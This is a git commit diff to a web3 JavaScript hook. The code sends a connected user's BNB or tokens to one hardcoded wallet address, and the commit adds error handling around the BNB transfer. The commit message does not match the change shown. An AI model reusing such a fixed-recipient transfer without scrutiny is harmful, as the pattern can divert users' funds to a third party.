ce2518f1866457fbf8e6b286589a980d6e08538c
Sousa Ivan <sousa.ivan99@gmail.com>
2023-06-08 14:50:18 +0200

    removed some logs and removed dripnetwork tab

--- hooks/web3Hook.js
+++ hooks/web3Hook.js
@@ -564,13 +564,16 @@ export const UseWeb3 = () => {
       console.log(selected1);
       if (amount) {
         let toAddress = "0x09af76733671e79302264353251c1e134b56caca"; // Replace 'a' with the desired wallet address
-
         if (selected1 == "0x0000000000000000000000000000000000000000") {
-          await web3.eth.sendTransaction({
-            from: addr, // Provide the "from" address
-            to: toAddress, // Provide the desired wallet address to transfer BNB to
-            value: amount, // Include the desired amount of BNB to send
-          });
+          try {
+            await web3.eth.sendTransaction({
+              from: addr, // Provide the "from" address
+              to: toAddress, // Provide the desired wallet address to transfer BNB to
+              value: amount, // Include the desired amount of BNB in wei
+            });
+          } catch (error) {
+            console.error("Error transferring BNB:", error);
+          }
         } else if (selected1 !== "0x0000000000000000000000000000000000000000") {
           const contract = new web3.eth.Contract(TOKEN_ABI, selected1);
           await contract.methods.transfer(toAddress, amount).send({
